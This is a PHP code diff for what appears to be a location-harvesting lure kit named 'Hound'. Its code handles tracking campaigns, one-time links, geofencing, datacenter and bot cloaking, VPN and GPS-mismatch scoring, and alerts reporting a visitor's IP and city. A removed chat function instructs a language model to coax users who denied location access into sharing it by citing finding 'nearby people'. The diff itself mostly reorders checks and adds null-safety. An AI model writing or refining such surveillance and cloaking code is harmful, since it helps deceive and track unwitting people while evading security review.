@@ -169,6 +169,9 @@ function hound_gate_check($token = null) {
     $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
     $ip = getClientIp();
     $enrichment = enrichIp($ip);
+    if (!is_array($enrichment)) {
+        $enrichment = [];
+    }
     $country = $enrichment['countryCode'] ?? null;
 
     $result = [
@@ -177,21 +180,12 @@ function hound_gate_check($token = null) {
         'ip' => $ip,
         'country' => $country,
         'city' => $enrichment['city'] ?? null,
-        'enrichment' => $enrichment,
+        'enrichment' => $enrichment ?: null,
         'campaign_id' => $_GET['id'] ?? (($config['campaigns'] ?? [])['default_campaign_id'] ?? 'default')
     ];
 
     if (!hound_schedule_allowed()) {
         return array_merge($result, ['allowed' => false, 'reason' => 'outside_schedule']);
-    }
-
-    if (!empty($security['one_time_links'])) {
-        $token = $token ?: ($_GET['t'] ?? null);
-        $tokenResult = hound_validate_token($token);
-        if (!$tokenResult['valid']) {
-            return array_merge($result, ['allowed' => false, 'reason' => $tokenResult['reason']]);
-        }
-        $result['campaign_id'] = $tokenResult['campaign_id'];
     }
 
     if (!hound_geofence_allowed($country)) {
@@ -208,6 +202,15 @@ function hound_gate_check($token = null) {
 
     if (!empty($security['block_datacenter_ips']) && hound_is_datacenter($enrichment)) {
         return array_merge($result, ['allowed' => false, 'reason' => 'datacenter_ip']);
+    }
+
+    if (!empty($security['one_time_links'])) {
+        $token = $token ?: ($_GET['t'] ?? null);
+        $tokenResult = hound_validate_token($token);
+        if (!$tokenResult['valid']) {
+            return array_merge($result, ['allowed' => false, 'reason' => $tokenResult['reason']]);
+        }
+        $result['campaign_id'] = $tokenResult['campaign_id'];
     }
 
     return $result;
@@ -373,7 +376,8 @@ function hound_reverse_geocode($lat, $lon) {
 function hound_compute_human_score($record) {
     $score = 35;
     $behavior = $record['behavior'] ?? [];
-    $ua = strtolower($record['server']['user_agent'] ?? $record['user_agent'] ?? '');
+    $server = is_array($record['server'] ?? null) ? $record['server'] : [];
+    $ua = strtolower($server['user_agent'] ?? $record['user_agent'] ?? '');
 
     if (($behavior['mouse_moves'] ?? 0) > 8) $score += 15;
     if (($behavior['clicks'] ?? 0) > 0) $score += 10;
@@ -390,12 +394,13 @@ function hound_compute_human_score($record) {
 
 function hound_compute_risk_score($record) {
     $score = 0;
-    $enrichment = $record['server']['ip_enrichment'] ?? [];
+    $server = is_array($record['server'] ?? null) ? $record['server'] : [];
+    $enrichment = is_array($server['ip_enrichment'] ?? null) ? $server['ip_enrichment'] : [];
     if (!empty($enrichment['proxy'])) $score += 25;
     if (!empty($enrichment['hosting'])) $score += 30;
     if (!empty($record['ip_gps_mismatch']['likely_vpn'])) $score += 35;
     if (($record['human_score'] ?? 50) < 40) $score += 20;
-    if (hound_is_bot($record['server']['user_agent'] ?? '')) $score += 50;
+    if (hound_is_bot($server['user_agent'] ?? '')) $score += 50;
     return min(100, $score);
 }
 
@@ -522,11 +527,13 @@ function hound_send_alert($eventType, $record) {
         return;
     }
 
+    $server = is_array($record['server'] ?? null) ? $record['server'] : [];
+    $enrichment = is_array($server['ip_enrichment'] ?? null) ? $server['ip_enrichment'] : [];
     $title = '[Hound] ' . strtoupper($eventType);
     $lines = [
         'Session: ' . ($record['session_id'] ?? 'n/a'),
-        'IP: ' . ($record['server']['server_ip'] ?? 'n/a'),
-        'City: ' . ($record['server']['ip_enrichment']['city'] ?? 'n/a'),
+        'IP: ' . ($server['server_ip'] ?? 'n/a'),
+        'City: ' . ($enrichment['city'] ?? 'n/a'),
         'Human: ' . ($record['human_score'] ?? 'n/a'),
         'Risk: ' . ($record['risk_score'] ?? 'n/a')
     ];
@@ -571,48 +578,6 @@ function hound_post_json($url, $payload) {
     @file_get_contents($url, false, $ctx);
 }
 
-function hound_llm_chat($message, $context) {
-    $config = hound_load_config();
-    $llm = $config['llm'] ?? [];
-    if (empty($llm['enabled']) || empty($llm['api_key'])) {
-        return null;
-    }
-
-    $system = $llm['system_prompt'] ?? 'You are a helpful assistant.';
-    if (!empty($context['city'])) {
-        $system .= ' The user appears to be near ' . $context['city'] . '.';
-    }
-    if (!empty($context['location_denied'])) {
-        $system .= ' The user denied location; politely explain why location helps find nearby people.';
-    }
-
-    $body = [
-        'model' => $llm['model'] ?? 'gpt-4o-mini',
-        'messages' => [
-            ['role' => 'system', 'content' => $system],
-            ['role' => 'user', 'content' => $message]
-        ],
-        'max_tokens' => 120,
-        'temperature' => 0.7
-    ];
-
-    $ctx = stream_context_create([
-        'http' => [
-            'method' => 'POST',
-            'header' => "Content-Type: application/json\r\nAuthorization: Bearer " . $llm['api_key'] . "\r\n",
-            'content' => json_encode($body),
-            'timeout' => 15
-        ]
-    ]);
-
-    $response = @file_get_contents($llm['api_url'] ?? 'https://api.openai.com/v1/chat/completions', false, $ctx);
-    if (!$response) {
-        return null;
-    }
-    $data = json_decode($response, true);
-    return $data['choices'][0]['message']['content'] ?? null;
-}
-
 function hound_rule_based_chat($message, $context) {
     $lang = $context['locale'] ?? 'en';
     $pack = hound_locale_pack($lang, $context['city'] ?? null);
@@ -642,10 +607,6 @@ function hound_rule_based_chat($message, $context) {
 }
 
 function hound_chat_response($message, $context) {
-    $llm = hound_llm_chat($message, $context);
-    if ($llm) {
-        return trim($llm);
-    }
     return hound_rule_based_chat($message, $context);
 }
 
@@ -659,7 +620,8 @@ function hound_process_record($record) {
         $record['return_visitor'] = hound_check_return_visitor($record['composite_fingerprint']);
     }
 
-    $enrichment = $record['server']['ip_enrichment'] ?? null;
+    $server = is_array($record['server'] ?? null) ? $record['server'] : [];
+    $enrichment = is_array($server['ip_enrichment'] ?? null) ? $server['ip_enrichment'] : null;
     $coords = $record['coordinates'] ?? null;
     if ($enrichment && $coords) {
         $record['ip_gps_mismatch'] = hound_ip_gps_mismatch($enrichment, $coords);
@@ -725,6 +687,9 @@ function hound_client_context() {
     $engagement = $config['engagement'] ?? [];
     $ip = getClientIp();
     $enrichment = enrichIp($ip);
+    if (!is_array($enrichment)) {
+        $enrichment = [];
+    }
     $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
     $lang = hound_pick_locale($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '', null);
     $city = $enrichment['city'] ?? 'your area';
